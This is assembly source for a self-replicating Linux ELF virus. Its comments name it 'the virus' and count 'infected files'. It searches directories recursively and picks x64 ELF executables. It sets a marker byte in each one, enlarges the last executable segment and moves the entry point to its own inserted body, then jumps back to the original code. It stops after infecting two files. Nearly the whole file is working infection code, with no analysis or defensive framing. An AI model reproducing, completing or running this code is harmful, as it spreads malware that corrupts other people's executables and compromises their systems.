.text

begin_body:
movq $0xfff1fff2ffff3fff, %rax
begin_body_1:
jmpq %rax

#fname:
#    .ascii "test_asm\0"
cwd: 
    .ascii ".\0"
pwd:
    .ascii "..\0" 
.globl main

main:
    mov $0x400000, %rdi
    mov $0xc24, %rsi
    mov $0x2, %rdx
    or $0x4, %rdx
    or $0x1, %rdx
    mov $0xa, %rax
    syscall 

    lea recursive_search, %rdi
    xor %rax, (%rdi)
# Save all the registers we are going to use
    
    push %r13
    lea 5(%rip), %rax 
    jmp push_registers
# Prepare to call recursive search, put the address of current directory name
# to %rdi (as the second parameter of the syscall)
    lea cwd(%rip), %rdi
# Through %r13 we are going to count infected files
    xor %r13, %r13
    call recursive_search

    lea 5(%rip), %rax 
    jmp pop_registers 
    pop %r13
    jmp begin_body

recursive_search:
# Okay, let's open current working directory
# open() syscall

    movq $0x0, %rsi
    lea cwd(%rip), %rdi
    movq $0x2, %rax
    syscall

# if not successfull - bye bye
    cmp $0x0, %rax
    jl finish_recursive_search 

# Now, fd of the opened dir is in %rax. we put it to %rax
    mov %rax, %r15

# We have to allocate a buffer for dirent structure, we will read them
# one by one, so we need the buffer that will be enough just for one dirent 
# First, get current program break
    mov $-1, %rdi
    mov $0xc, %rax
    syscall

# Now current program break is in %rax, let's put it to %r14
    mov %rax, %r14
    
# Set the new program break
    mov %r14, %rdi
    add $1024, %rdi    
    mov $0xc, %rax
    syscall

check_getdents:
# Try to get first dirent
# getdents() syscall
    mov %r15, %rdi
    mov %r14, %rsi
    xor %rdx, %rdx
    add $1024, %rdx
    mov $78, %rax
    syscall
    cmp $0x0, %rax    
    je end_recursive_search

    call process_dirents

    cmp $0x2, %r13
    je end_recursive_search

    jmp check_getdents 

end_recursive_search:
# Before return we have to put the program break back and close all the open files
# brk() syscall
    mov %r14, %rdi
    mov $0xc, %rax
    syscall

# close() syscall
    mov %r15, %rdi
    mov $0x3, %rax
    syscall

finish_recursive_search:
    ret


# Main part of the virus, process of checking and infection if it's possible
# Address of the name of the victims file is in %rax
test_and_infect:
    xor %r15, %r15
# open() syscall
    movq $0x2, %rsi
    #lea fname(%rip), %rdi
    #lea fname(%rip), %rdi
    mov %rax, %rdi
    movq %rsi, %rax
    syscall

# write() syscall -- test
#    mov $0x1, %rdi
#    lea fname, %rsi
#    mov $0x8, %rdx
#    mov $0x1, %rax
#    syscall
    

    cmp $0x0, %rax
    jl wont_infect 

# Save descriptor of opened file to %r15
   mov %rax, %r15 
#    mov $0x7, %r15

# lseek() syscall, find of file size
    mov %r15, %rdi
    xor %rsi, %rsi
    mov $0x2, %rdx
    mov $0x8, %rax
    syscall     
    
# save file size to %r14 
    mov %rax, %r14
    
# will not infect if file is too big
    cmp  $0xffffff, %r14
    jg wont_infect 

# will not infect if the size is too small
    cmp $0x20, %r14
    jl wont_infect

# mmap with elf header size
    mov $0x0, %rdi
    mov $0x20, %rsi
    mov $0x1, %rdx
    mov $0x02, %r10
    mov %r15, %r8
    mov $0x0, %r9
    mov $0x9, %rax
    syscall

# Save the address of mapped elf header of the victim's file 
    mov %rax, %r13

# Check if the target is actually suitable and non-infected elf
    mov %r13, %rdi
    call check_elf
    cmp $0x0, %rax
    jne wont_infect 
will_infect:
# Save the previous entry point in stack
    call save_epoint
# Now entry point is in %rcx, push it to the stack
    push %rcx

# Find offset and the size of the program header table. See comments below
    call find_ptaboff
# Now offset of the table is in %rbx, size of the table is in %rax
# Save them to %rax  %r10  to so we're able to make syscall.
    mov %rax, %r10

    
# unmap elf header
    mov %r13, %rdi
    mov $0x20, %rsi
    mov $0xB, %rax
    syscall

# mmap to the beginning of the file including  program header table
# set prot to PROT_READ | PROT_WRITE 
    mov $0x0, %rdi
    mov %r10, %rsi
    add $0x20, %rsi # add header size to map from the beginning of the file
    mov $0x1, %rdx  # PROT_READ
    or $0x2, %rdx   # PROT_WRITE
    mov $0x01, %r10 # MAP_SHARED
    mov %r15, %r8
    #mov %rbx, %r9
    mov $0x0, %r9
    mov $0x9, %rax
    syscall

# Now offset of table is still in %rbx and size of the table is in %rsi
# TODO: check if %rsi must be decreased by 0x20

    sub $0x20, %rsi

# Save the address of the mapped area to the %rdi
    mov %rax, %rdi 

# Find the last loadable and executable segment
    call find_lstseg

# Now offset of header of executable and loadable segment is in %rax
# Mark elf header so we won't infect it once again
    call mark_victim

# We need to correct offset of the section header table
    call correct_sh_offset

# Change the current entry point
    call correct_epoint

# Change p_filesz and p_memsz fields of segment's header
# Change offsets of all segments which are located after the expanding segment
    call correct_size

# Find the offset of the end of the last suitable segment
# At that position we're going to insert our body

    call find_ins_pos

# The position to insert is in %rax. Put it to %r13
    mov %rax, %r13

# unmap previous mapping and save all changes
    mov $0xb, %rax
    syscall 

# Now we have to allocate temporary buffer to save there the last
# part of the file after the inserting position
check_brk:
    mov $-1, %rdi
    mov $0xc, %rax
    syscall

# Current break address is located in %rax, so we ought to increase it
# to the size of the last part of the file plus (0x1000 - virus_size)
# to save the aligment
# File size is located in %r14, position to insert is in %r13
# Thus the size of the memory we need to allocate is (filesize - position) +
# + (0x1000 - virus_size)

    mov %rax, %rdi
    add %r14, %rdi
    sub %r13, %rdi
    add $0x1000, %rdi
    sub end_body(%rip), %rdi
    sub $0xa, %rdi # first mov command of the virus
    sub $0x8, %rdi # last 8 bytes of the virus that contain body size
    mov $0xc, %rax
    syscall

# Now in %rax we have a new break pointer, memory is allocated.
# We need to put file pointer at the insert position, and then
# read the rest of the file into the buffer we've just allocated

# But first we save break pointer to %r12
    mov %rax, %r12

lseek_test:
# lseek() syscall, set pointer to the insert position 
    mov %r15, %rdi
    mov %r13, %rsi
    mov $0x0, %rdx
    mov $0x8, %rax
    syscall     

# read() syscall
    mov %r15, %rdi
    mov %r12, %rsi
    sub %r14, %rsi
    add %r13, %rsi
    mov %r14, %rdx
    sub %r13, %rdx
    mov $0x0, %rax
    syscall 

# Now we have to put file pointer back
# lseek() syscall
    mov %r15, %rdi
    mov %r13, %rsi
    mov $0x0, %rdx
    mov $0x8, %rax
    syscall     

# Time to write first bytes of the virus to the victim
# First we write the 1-byte opcode of the mov command
# write() syscall
check_write_1:
    mov %r15, %rdi
    lea begin_body(%rip), %rsi
    mov $0x2, %rdx 
    mov $0x1, %rax
    syscall

# Now we have to write saved entry point address, which is located on the top of the stack
# It's on the top of the stack, so we set the value of %rsp a buffer parameter
# of the write() syscall

    mov %r15, %rdi
    mov %rsp, %rsi
    mov $0x8, %rdx
    mov $0x1, %rax
    syscall

# We don't need the entry point address anymore
    pop %rcx

# We are ready to write the rest of the virus' body
check_write:
    mov %r15, %rdi
    lea begin_body_1(%rip), %rsi
    mov end_body(%rip), %rdx
    add $0x8, %rdx
    mov $0x1, %rax
    syscall
 
# Next we write the saved part of the file right after the virus' body.
    mov %r15, %rdi
    mov %r12, %rsi  # %r12 contains our new program break that points to the end of the buffer
    sub %r14, %rsi  # Thus we need to minus the size of the buffer
    add %r13, %rsi
    sub $0x1000, %rsi
    add $0xa, %rsi
    add $0x8, %rsi
    add end_body(%rip), %rsi
    mov %r14, %rdx
    sub %r13, %rdx
    add $0x1000, %rdx
    sub end_body(%rip), %rdx
    sub $0xa, %rdx
    sub $0x8, %rdx
    mov $0x1, %rax
    syscall

# We must set program break to the previous position (free the memory)
# Notice that from the previous syscall we still have our previous program break saved in %rsi
    mov %rsi, %rdi
    mov $0xc, %rax
    syscall

#   Before return we must close the file 
    mov %r15, %rdi
    mov $0x3, %rax
    syscall
    
    xor %rax, %rax
    ret
wont_infect:
    cmp $0x0, %r15
    je end_infect
    mov %r15, %rdi
    mov $0x3, %rax
    syscall
end_infect:
    mov $-1, %rax
    ret

push_registers:
    pushf
    push %rsi
    push %rdi
    push %rdx
    push %r15
    push %r14
    push %r12
    push %r11
    push %r10
    push %r9
    push %r8
    push %rcx
    push %rbx
#    push %r13
    jmp %rax

pop_registers:
#    pop %r13
    pop %rbx
    pop %rcx
    pop %r8
    pop %r9
    pop %r10
    pop %r11
    pop %r12
    pop %r14
    pop %r15
    pop %rdx
    pop %rdi
    pop %rsi
    popf
    jmp %rax



# TODO: maybe it's possible to make it shorter
check_elf:
    xor %rax, %rax

# Check elf magic number
    cmpb $0x7f, (%rdi)
    jne not_equal 
    cmpb $0x45, 1(%rdi)
    jne not_equal 
    cmpb $0x4c, 2(%rdi)
    jne not_equal
    cmpb $0x46, 3(%rdi)
    jne not_equal

# Check object file type (must be executable)
    cmpb $0x2, 16(%rdi)
    jne not_equal

# Check architecture (must be x64)
    cmpb $0x3e, 18(%rdi)
    jne not_equal

# Check if it's already infected
    cmpb $0xb, 9(%rdi)
    je not_equal

    ret
not_equal:
    mov $0x1, %rax
    ret


# Save entry point to the stack
# Address of the elf header is in %rdi
save_epoint:
    movq 24(%rdi), %rcx
    ret

# Find offset and size of the program header table.
# Offset will be returned in %rbx when the size will be resided in %rax
find_ptaboff:    
    movw 54(%rdi), %rbx
    movw 56(%rdi), %rax  
    mul %ebx
    
# Load program header table offset
    mov 32(%rdi), %rbx

    ret

# Find last executable and loadable segment
# Will take the address of the mapped header in %rdi,
# the size of the table in %rsi and the offset in %rbx
find_lstseg:
    add %rbx, %rdi
#    mov %rbx, %rcx
    xor %rcx, %rcx
find_loop:
    cmpl $0x1, (%rdi)
    jne next_iter
    movl 4(%rdi), %eax
    andl $0x1, %eax
    jnz found_seg
next_iter:
    add $56, %rdi
    add $56, %rcx
    cmp %rsi, %rcx
    jg not_found_seg
    jmp find_loop
found_seg:    
    sub %rcx, %rdi
    sub %rbx, %rdi
    mov %rcx, %rax
    add %rbx, %rax
    ret
not_found_seg:
    sub %rcx, %rdi
    sub %rbx, %rdi
    xor %rax, %rax
    mov -1, %rax
    ret

# Offset of the needed header is in %rax, mapped address of the header is in %rdi
# Offset to the program header table is in %rbx, size of that table is in %rsi

mark_victim:
   movb $0xb, 9(%rdi)
   ret 

correct_sh_offset:
    addq $0x1000, 40(%rdi)
    ret

correct_epoint:
    add %rax, %rdi
    mov 16(%rdi), %rcx
    add 40(%rdi), %rcx
    sub %rax, %rdi
    mov %rcx, 24(%rdi)
    # TODO: change back to main1
    lea main(%rip), %r11
    lea begin_body(%rip), %rcx
    sub %rcx, %r11
    add %r11, 24(%rdi)
    ret


# Change p_filesz and p_memsz fields of segment's header
# Change offsets of the other segments which are located after the expanding segment
# Offset of the needed header is in %rax, mapped address of the header is in %rdi
# Offset to the program header table is in %rbx, size of that table is in %rsi
correct_size:
    add %rax, %rdi
    mov 32(%rdi), %r11    # now file size of the expanding segment is in %r11
    addq $0x1000, 32(%rdi) 
    addq $0x1000, 40(%rdi)
    sub %rax, %rdi

    xor %rcx, %rcx
    add %rbx, %rdi
correct_loop:
    cmp %r11, 8(%rdi)
    jg change_offset 
correct_continue:
    add $56, %rdi
    add $56, %rcx
    cmp %rsi, %rcx
    jge end_correct_size
    jmp correct_loop
change_offset:
    addq $0x1000, 8(%rdi)
    jmp correct_continue
end_correct_size:
    sub %rcx, %rdi
    sub %rbx, %rdi
    ret

# Find the position starting from which we're going to insert our code
# The offset of the header of the segment is in %rax
find_ins_pos:
   add %rax, %rdi
   mov 8(%rdi), %rcx 
   add 32(%rdi), %rcx
   sub $0x1000, %rcx  # We have to sub 0x1000 since p_filesz has already been modified
   sub %rax, %rdi
   mov %rcx, %rax
   ret

# Process our dirents, size of them is in %rax, the initial address is in %r14
# In case we see the regular file - we try to check and ifect it
# In case of the directory we do recursive search
# The number of infected files is located in %r13, once it hits 2 the virus
# will give the way to the victim's body
process_dirents:
    cmp $0x2, %r13
    je end_process_dirents
    xor %rcx, %rcx
#    xor %r13, %r13
    xor %r12, %r12
    mov %rax, %r9    # save the size of the structure to %r9, so we can use %rax
dirents_loop:
    movw 16(%r14), %r12
    add %r12, %r14
    cmpb $0x4, -1(%r14)
    je dir_found
    cmpb $0x8, -1(%r14)
    je regfile_found
    sub %r12, %r14
continue_dirents_loop:
    addw 16(%r14), %rcx
    addw 16(%r14), %r14
    cmp %r9, %rcx
    jge end_process_dirents
    cmp $0x2, %r13
    je end_process_dirents
    jmp dirents_loop
         
dir_found:
    sub %r12, %r14
    lea 5(%rip), %rax 
    jmp push_registers
    
    lea 18(%r14), %rax
    call check_dir_name
    cmp $0x0, %rax
    jne end_dir_found
    
# We need to change current directory to the child one
    lea 18(%r14), %rdi
    mov $80, %rax
    syscall
    
    cmp $0x0, %rax
    jne end_dir_found
    
    call recursive_search

    lea pwd(%rip), %rdi
    mov $80, %rax
    syscall
    
end_dir_found:     
    lea 5(%rip), %rax
    jmp pop_registers
    jmp continue_dirents_loop

regfile_found:
    sub %r12, %r14
    lea 5(%rip), %rax
    jmp push_registers
    push %r13
    lea 18(%r14), %rax
    check_infection:
    call test_and_infect
    pop %r13
    cmp $0x0, %rax
    je infected
    jmp end_infection
infected:
    inc %r13 
end_infection:
    lea 5(%rip), %rax
    jmp pop_registers
    cmp $0x2, %r13
    je end_process_dirents

    jmp continue_dirents_loop
    

end_process_dirents:
    sub %rcx, %r14
    ret


# We can't move to the current dir and the parent dir during recursive search
# Address to the dir name is in %rax

check_dir_name:
    push %rcx
    push %rbx
    mov $0x2, %rcx
    lea cwd-1(%rip), %r11
    dec %rax
check_cwd_loop:
    inc %r11
    inc %rax
    movb (%r11), %bl
    cmpb %bl, (%rax)
    jne next_dir_name_check
    loop check_cwd_loop
    cmp $0x0, %rcx
    je dir_equal
    
next_dir_name_check:
    mov $0x2, %rbx
    sub %rcx, %rbx
    sub %rbx, %rax

    mov $0x3, %rcx
    lea pwd-1(%rip), %r11
    dec %rax
check_pwd_loop:
    inc %r11
    inc %rax
    movb (%r11), %bl
    cmpb %bl, (%rax)
    jne not_cwd_pwd
    loop check_pwd_loop
    cmp $0x0, %rcx
    je dir_equal
    
    mov $0x3, %rbx
    sub %rcx, %rbx
    sub %rbx, %rax
    jmp not_cwd_pwd

dir_equal:
    mov $0x1, %rax
    jmp finish_check_dir_name

not_cwd_pwd:
    xor %rax, %rax
    jmp finish_check_dir_name
finish_check_dir_name:
    pop %rbx
    pop %rcx
    ret
end_body:
    .quad . - begin_body_1
